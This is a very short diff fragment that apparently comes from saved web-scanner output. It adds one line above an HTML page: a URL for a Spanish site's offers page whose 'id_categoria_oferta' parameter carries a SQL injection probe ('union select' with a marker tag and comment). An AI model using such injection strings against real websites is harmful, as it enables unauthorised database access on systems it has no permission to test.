@@ -1,4 +1,4 @@
-
+http://www.abalar.es/categorias_ofertas.php?id_categoria_oferta=1%20union%20select%20'<injres>0</injres>'%20--
            
 
 <html>
